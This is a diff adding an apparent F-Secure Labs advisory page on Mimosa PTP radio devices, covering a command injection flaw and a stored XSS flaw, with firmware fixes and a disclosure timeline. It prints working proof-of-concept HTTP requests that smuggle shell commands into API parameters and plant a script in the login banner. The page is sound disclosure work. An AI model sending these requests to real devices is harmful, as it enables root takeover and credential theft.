@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <base href="https://labs.f-secure.com/"><!--[if lte IE 6]></base><![endif]-->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+<meta name="x-subsite-id" content="1" />
+
+    <title>Mimosa PTP Devices - Multiple Vulnerabilities</title>
+
+    <link rel="stylesheet" href="https://labs.f-secure.com/themes/mwr/css/style.css?t=20200715">
+    <link rel="stylesheet" href="https://labs.f-secure.com/themes/labs/css/style.css?t=20200715">
+
+    <meta name="description" content="">
+    <link rel="canonical" href="https://labs.f-secure.com/advisories/mimosa-ptp-devices-multiple-vulnerabilities/">
+    <meta name="robots" content="NOODP,index,follow">
+
+    
+
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+
+    <meta name="format-detection" content="telephone=no">
+    
+    <meta property="og:title" content="">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="F-Secure Labs">
+    <meta property="og:url" content="https://labs.f-secure.com/advisories/mimosa-ptp-devices-multiple-vulnerabilities/">
+    
+    <meta property="og:locale" content='en_GB'>
+    <meta name="twitter:card" content="summary">
+    
+    <meta name="twitter:title" content="">
+    <meta name="twitter:description" content="">
+
+  <script>
+    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});
+    var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;
+    j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})
+    (window,document,'script','dataLayer','GTM-KD9T85H');
+  </script>
+  <meta name="google-site-verification" content="jqRTM8I_uI-jDIu1ITng14jD-3iJy0l3TTCIl2I-BIo" />
+<link rel="stylesheet" type="text/css" href="/themes/labs/css/style.css?m=1600760392" />
+</head>
+<body class="BlogPost" dir="ltr">
+
+    <header class="head menu-opened" id="top">
+	<div class="container">
+		<div class="col12">
+			<div class="logo">
+				<a href="/">F-Secure</a>
+			</div>
+		    <a href="/advisories/mimosa-ptp-devices-multiple-vulnerabilities/#nav" class="btn-menu">Menu</a>
+
+<nav class="main-nav" itemscope itemtype="https://schema.org/SiteNavigationElement">
+    <ul>
+        
+            <li class="section nav-advisories"><a href="/advisories/" title="Advisories">Advisories</a></li>
+        
+            <li class="link nav-blog"><a href="/blog/" title="/var/log/messages">/var/log/messages</a></li>
+        
+            <li class="link nav-publications"><a href="/publications/" title="Publications">Publications</a></li>
+        
+            <li class="link nav-tools"><a href="/tools/" title="Tools">Tools</a></li>
+        
+            <li class="link nav-archive"><a href="/archive/" title="Archive">Archive</a></li>
+        
+        <li class="nav-careers"><a href="https://www.f-secure.com/en/web/about_global/careers/job-openings">Careers</a></li>
+    </ul>
+</nav>
+
+		</div>
+	</div>
+</header>
+
+
+    <div class="wrapper">
+
+        <section class="section">
+  <div class="page-title">
+    <div class="container">
+      <span class="content-type"></span>
+      <h1>Mimosa PTP Devices - Multiple Vulnerabilities</h1>
+      
+      
+    </div>
+  </div>
+</section>
+
+<section class="section">
+  <div class="container">
+    <div class="col8">
+      <div class="blog-post">
+        
+        <table>
+          <tr>
+            <td>Product</td>
+            <td>B5c/B5/C5c</td>
+          </tr>
+          <tr>
+            <td>Severity</td>
+            <td>High</td>
+          </tr>
+          <tr>
+            <td>CVE Reference</td>
+            <td>CVE-2020-25206,CVE-2020-25205</td>
+          </tr>
+          <tr>
+            <td>Type</td>
+            <td>RCE,XSS</td>
+          </tr>
+        </table>
+        
+        <h1><span style="text-decoration: underline;">Introduction</span></h1><p>F-Secure identified a number of high risk vulnerabilities on Mimosa Point-To-Point (PTP) Backhaul radio devices, which allow threat actors to achieve the following:</p><ul>
+<li>Remotely execute commands on the device's underlying operating system, either from unauthenticated or authenticated perspectives depending on the device's firmware release.<br><br></li>
+<li>Store Cross-Site Scripting (XSS) payloads within the device's web management portals, potentially allowing for credential theft.</li>
+</ul><p>These devices are typically <span>used by commercial or private entities to provide wireless network connectivity between two sites. Whilst not required to be accessible from the public Internet F-Secure observed numerous devices that exposed their administrative panel. Each of the vulnerabilities presented below could therefore be leveraged to exploit such devices and gain full control. <br></span></p><p>These issues can be mitigated by updating to the most recent firmware versions for the B5/B5c/C5c PTP radio devices.</p><h1><em><strong>CVE-2020-25206 - Remote Command Execution (Multiple)</strong></em></h1><ul>
+<li><strong><em><em>Affected devices: B5/B5c/C5c</em></em></strong></li>
+<li><strong><em><em>Affected firmware:</em></em></strong></li>
+<ul>
+<li><strong><em><em>Unauthenticated RCE: <em> ≤ 1.5.3, <strong><em><em><em>≤  </em></em></em></strong>2.5.0.3</em></em></em></strong></li>
+<li><strong><em><em>Authenticated RCE: <strong><em><em><em><strong><em><em><em>≤ </em></em></em></strong></em></em></em></strong><em><em>2.8.0.3</em></em></em></em></strong></li>
+</ul>
+</ul><p><strong>Unauthenticated RCE:</strong></p><p>The Mimosa PTP B5, B5c and C5c backhaul radio firmware from versions 1.5.2 and onwards contained unauthenticated command injection vulnerabilities, stemming from the <strong>getThroughput()</strong> method of the <strong style="font-style: italic;">/var/www/core/api/calls/Througput.php </strong>class. This allowed for arbitrary command execution on the underlying device with administrative privileges:</p><pre>GET /core/api/calls/Throughput.php?from=1;+id HTTP/1.1<br>Host: 192.168.25.1<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0<br>Accept: application/json, text/javascript, */*; q=0.01<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: <a href="http://192.168.25.1/index.php">http://192.168.25.1/index.php<br></a>X-Requested-With: XMLHttpRequest<br>Connection: close<br><br>HTTP/1.1 200 OK<br>Cache-Control: private, no-cache, max-age=0, no-store<br>X-Powered-By: PHP/5.5.8<br>Content-type: text/html<br>Connection: close<br>Date: Tue, 01 Jan 2019 00:18:24 GMT<br>Server: lighttpd/1.4.33<br>Content-Length: 53<br><br>{"values":{"Throughput":["uid=0(root) gid=0(root)"]}}</pre><p><strong>Authenticated RCE:</strong></p><p>The Mimosa PTP B5, B5c and C5c backhaul radio firmware from versions 2.8.0.3 and below contained authenticated command injection vulnerabilities, stemming from the <strong>get()</strong> method of the following API classes:</p><ul>
+<li>Throughput class (<strong>/var/www/core/api/calls/Througput.php</strong>)</li>
+<li>WanStats  (<strong>/var/www/core/api/calls/WanStats.php</strong>)</li>
+<li>PhyStats (<strong>/var/www/core/api/calls/PhyStats.php</strong>)</li>
+<li>QosStats (<strong>/var/www/core/api/calls/QosStats.php</strong>)</li>
+</ul><p>Authentication was introduced in the the 2.8.0.x firmware for these APIs. The POST request shown below demonstrates how the <strong>$duration</strong> parameter of the <strong>WanStats.php</strong> endpoint may be abused to execute arbitrary commands when authenticated. Note that for this to be successful the <strong>$cf</strong> and <strong>$resolution</strong> values must also be specified for the user input to be passed to <strong>shell_exec() </strong>method.</p><pre>POST /core/api/calls/WanStats.php HTTP/1.1<br>Host: 192.168.1.20<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0<br>Accept: application/json, text/javascript, */*; q=0.01<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: <a href="http://192.168.1.20/">http://192.168.1.20/</a><br>X-Requested-With: XMLHttpRequest<br>DNT: 1<br>Connection: close<br>Cookie: PHPSESSID=odekk2go1k8j3hk5pm1grjmg23<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 43<br><br><strong>duration=100;+id;</strong>&amp;resolution=100&amp;cf=AVERAGE</pre><p> The response shows the output of the <strong>id</strong> command:</p><pre>HTTP/1.1 200 OK<br>X-Powered-By: PHP/7.2.22<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate<br>Pragma: no-cache<br>Content-type: text/plain;charset=UTF-8<br>Content-Length: 1580<br>Connection: close<br>Date: Wed, 01 Jan 2020 01:13:37 GMT<br>Server: lighttpd/1.4.54<br><br> txFrOK_0 txFrTotal_0 txOctetsOK_0 txFrErr_0 txFrSingleClsn_0 txFrMultipleClsn_0 txFrLateClsn_0 txFrExcessiveClsn_0 txFrUnicast_0 txFrMulticast_0 txFrBroadcast_0 txFrPause_0 rxFrOK_0 rxFrTotal_0 rxFrCrcErr_0 rxFrAlignErr_0 rxFrTotalErr_0 rxOctetsOK_0 rxOctetsTotal_0 rxFrUnicast_0 rxFrMulticast_0 rxFrBroadcast_0 rxFrPause_0 rxFrLenErr_0 rxFrUndersized_0 rxFrOversized_0 rxFrFrags_0 rxFrJabber_0 rxFrLen64_0 rxFrLen65-127_0 rxFrLen128-255_0 rxFrLen256-511_0 rxFrLen512-1023_0 rxFrLen1024-1518_0 rxFrLenOver1518_0 rxFrDropBufFull_0 rxFrTruncBufFull_0<br><br>1577841200: 4.0650000000e+00 4.0650000000e+00 2.6227600000e+03 0.0000000000e+00 0.0000000000e+00 0.0000000000e+00 0.0000000000e+00 0.0000000000e+00 3.8200000000e+00 0.0000000000e+00 2.4500000000e-01 0.0000000000e+00 3.2750000000e+00 3.2750000000e+00 0.0000000000e+00 0.0000000000e+00 0.0000000000e+00 4.7951500000e+02 4.7951500000e+02 3.0950000000e+00 0.0000000000e+00 1.8000000000e-01 0.0000000000e+00 0.0000000000e+00 0.0000000000e+00 0.0000000000e+00 0.0000000000e+00 0.0000000000e+00 1.8000000000e-01 2.5350000000e+00 0.0000000000e+00 4.4000000000e-01 1.2000000000e-01 0.0000000000e+00 0.0000000000e+00 0.0000000000e+00 0.0000000000e+00<br>1577841300: nan nan nan nan nan nan nan nan nan nan nan nan nan nan nan nan nan nan nan nan nan nan nan nan nan nan nan nan nan nan nan nan nan nan nan nan nan<br><strong>uid=0(root) gid=0(root)</strong></pre><h1><em>CVE-2020-25205 - Unauthenticated Stored XSS<br></em></h1><ul>
+<li><strong><em><em>Affected devices: B5/B5c/C5c</em></em></strong></li>
+<li><em><strong>Firmware: <em><em><em>≤ </em></em></em></strong><em><strong>2.8.0.3</strong><br></em></em></li>
+</ul><p>The web console could be configured to display a banner to unauthenticated users when the base URL is requested. It was found that no authentication was required to set the banner text for an affected device and that its content's could be leveraged to introduce arbitrary JavaScript code.</p><p>The following POST request could be sent to vulnerable devices to configure the banner text and introduce a benign "alert(1)" XSS payload:</p><pre>POST /?q=index.set_banner HTTP/1.1<br>Host: 192.168.1.20<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0<br>Accept: text/html<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: <a href="https://192.168.1.21/">https://192.168.1.21/<br></a><br>Content-Type: multipart/form-data; boundary=---------------------------4580394065576203491155952929<br>Content-Length: 248<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br><br>-----------------------------4580394065576203491155952929<br>Content-Disposition: form-data; name="upload"; filename="banneruploadtest"<br>Content-Type: text/html<br><br><strong>&lt;script&gt;alert(1)&lt;/script&gt;</strong><br><br><br>-----------------------------4580394065576203491155952929--</pre><p>The XSS payload would triggered by visiting the web console without authentication, as shown in the screenshot below. Note that the banner could not be removed after updating the contents of <strong>/mnt/jffs2/banner.txt. </strong>To remove the banner, the file must either be deleted from disk, this would require an administrator login to the device over telnet or SSH.</p><p><img class="leftAlone" style="display: block; margin-left: auto; margin-right: auto;" title="" src="assets/Uploads/_resampled/ResizedImageWzYwMCwzMTJd/XSS-FSLabs.PNG" alt="XSS FSLabs" width="600" height="312"></p><h1><span style="text-decoration: underline;">Solution<br></span></h1><p>It is recommended that B5/B5c/C5c device operators upgrade the firmware to the latest stable versions. Mitigations for CVE-2020-25205 and CVE-2020-25206 were introduced in the following firmware releases:</p><ul>
+<li>1.5.5</li>
+<li>2.5.4</li>
+<li>2.8.1</li>
+</ul><p>Firmware versions can be obtained from the following URL, after enrolling for a Mimosa account:</p><ul>
+<li><a title="https://cloud.mimosa.co/app/index.html#/updateFirmware/firmwareDownload/" href="https://cloud.mimosa.co/app/index.html#/updateFirmware/firmwareDownload/" target="_blank">https://cloud.mimosa.co/app/index.html#/updateFirmware/firmwareDownload/</a></li>
+</ul><h1><span style="text-decoration: underline;">Disclosure Timeline</span></h1><table>
+<tbody>
+<tr>
+<td>Date</td>
+<td>Summary</td>
+</tr>
+<tr>
+<td>22/05/2020</td>
+<td>Unauthenticated RCE vulnerability discovered.</td>
+</tr>
+<tr>
+<td>26/05/2020</td>
+<td>Vendor contacted. No response received.</td>
+</tr>
+<tr>
+<td>13/07/2020</td>
+<td>Authenticated RCE vulnerabilities discovered.</td>
+</tr>
+<tr>
+<td>17/07/2020</td>
+<td>XSS vulnerability discovered.</td>
+</tr>
+<tr>
+<td>07/09/2020</td>
+<td>CVE IDs requested.</td>
+</tr>
+<tr>
+<td>08/09/2020</td>
+<td>CVE IDs granted from MITRE.</td>
+</tr>
+<tr>
+<td>17/09/2020</td>
+<td>Follow up email sent directly to vendor. No response received.</td>
+</tr>
+<tr>
+<td> 02/11/2020</td>
+<td>Follow up email sent directly to Mimosa contact. Vendor requests further information</td>
+</tr>
+<tr>
+<td> 09-19/11/2020</td>
+<td> Advisory shared with vendor, vendor acknowledges vulnerabilities</td>
+</tr>
+<tr>
+<td>01-02/12/2020</td>
+<td>Vendor shares beta firmware, including patches for CVE-2020-25205,CVE-2020-25206</td>
+</tr>
+<tr>
+<td>02-04/12/2020</td>
+<td>F-Secure confirm issues are no longer present in latest beta firmware</td>
+</tr>
+<tr>
+<td>01/01/2021</td>
+<td>Vendor officially releases firmware upgrades, containing mitigations</td>
+</tr>
+<tr>
+<td>11/05/2021</td>
+<td>Advisory published</td>
+</tr>
+</tbody>
+</table><h1><span style="text-decoration: underline;">References</span></h1><ul>
+<li>CVE-2020-25205:</li>
+<ul>
+<li><a title="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25205" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25205">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25205</a></li>
+</ul>
+<li>CVE-2020-25206:</li>
+<ul>
+<li><a title="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25206" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25206">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25206</a></li>
+</ul>
+</ul>
+      </div>
+      <div class="social-share">
+        <p><span class="content-type">Share</span></p>
+        <ul class="social">
+  <li class="facebook"><a href="http://www.facebook.com/sharer.php?u=https://labs.f-secure.com/advisories/mimosa-ptp-devices-multiple-vulnerabilities/" target="_blank">Share on Facebook</a></li>
+  <li class="twitter"><a href="https://twitter.com/share?url=https://labs.f-secure.com/advisories/mimosa-ptp-devices-multiple-vulnerabilities/&text=Mimosa PTP Devices - Multiple Vulnerabilities" target="_blank">Share on LinkedIn</a></li>
+  <li class="linkedin"><a href="http://www.linkedin.com/shareArticle?url=https://labs.f-secure.com/advisories/mimosa-ptp-devices-multiple-vulnerabilities/&title=Mimosa PTP Devices - Multiple Vulnerabilities" target="_blank">Share on Twitter</a></li>
+</ul>
+
+      </div>
+    </div>
+    <div class="col4">
+      
+
+      
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="container">
+      <div class="col12">
+        <p>&nbsp;</p>
+      </div>
+    </div>
+  </section>
+
+
+    </div>
+
+    <footer class="foot">
+	<div class="container">
+    <div class="footer-flex-wrap">
+     <p class="logo"><img src="https://labs.f-secure.com//themes/labs/img/fs-labs-logo-white.svg" alt="F-Secure" width="180" height="60"></p>
+      <ul class="top-menu">
+        <li><a href="/advisories/mimosa-ptp-devices-multiple-vulnerabilities/#top" class="btn-gototop">Top</a></li>
+        
+        <li class="link"><a href="https://www.f-secure.com/en/consulting/contact">Contact</a></li>
+        
+        
+      </ul>
+   </div>
+   <hr/>
+    <div class="col5 suf1 foot-about">
+      <p>F-Secure provides specialist advice and solutions in all areas of cyber security, from professional and managed services, through to developing commercial and open source security tools.  </p>
+    </div>
+    <div class="col3">
+      <ul class="footer-list no-margin">
+        
+        <li><a href="/publications/ti-report-lazarus-group-cryptocurrency-vertical/">Threat Intelligence Report: Lazarus Group Campaign Targeting the Cryptocurrency Vertical</a></li>
+        
+        <li><a href="/publications/the-fake-cisco/">The Fake Cisco</a></li>
+        
+        <li><a href="/publications/u-booting-securely/">U-Booting securely</a></li>
+        
+      </ul>
+    </div>
+    <div class="col3">
+     <ul class="footer-list">
+      
+      <li><a href="/blog/prelude-to-ransomware-systembc/">Prelude to Ransomware: SystemBC</a></li>
+      
+      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-3/">Attack Detection Fundamentals 2021: Azure - Lab #3</a></li>
+      
+      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-2/">Attack Detection Fundamentals 2021: Azure - Lab #2</a></li>
+      
+    </ul>
+  </div>
+</div>
+<div class="end">
+ <div class="container">
+  <hr/>
+  <div class="footer-flex-wrap">
+   <p class="copyright">Copyright &copy; 2021 F-Secure</p>
+    <ul class="social">
+      
+      <li class="linkedin for-footer"><a href="https://www.linkedin.com/showcase/28493188" target="_blank">Connect with us on LinkedIn</a></li>
+      
+      
+      <li class="twitter for-footer"><a href="https://twitter.com/fsecurelabs" target="_blank">Follow us on Twitter</a></li>
+      
+      
+      <li class="github for-footer"><a href="https://github.com/fsecurelabs" target="_blank">Follow us on GitHub</a></li>
+      
+    </ul>
+ </div>
+</div>
+</div>
+</footer>
+
+    <script src="/themes/mwr/js/min/jquery-3.5.1.min.js" id="jqueryscript"></script>
+
+    
+    <script src="/themes/mwr/js/min/slides.min.js"></script>
+    
+
+    <script src="/themes/mwr/js/min/scripts.js?20190917" id="pagescripts"></script>
+
+    <script type="application/ld+json">
+    { "@context" : "http://schema.org",
+      "@type" : "Organization",
+      "name" : "F-Secure Labs",
+      "url" : "https://labs.f-secure.com",
+      "logo" : "https://labs.f-secure.com/themes/labs/img/fs-labs-logo-white.svg",
+      "sameAs" : [
+          "https://twitter.com/fsecurelabs",
+          "https://www.linkedin.com/showcase/28493188"],
+      "contactPoint" : [
+        { "@type" : "ContactPoint",
+          "telephone" : "+441256300920",
+          "contactType" : "customer service"
+        } ]
+    }
+    </script>
+</body>
+</html>
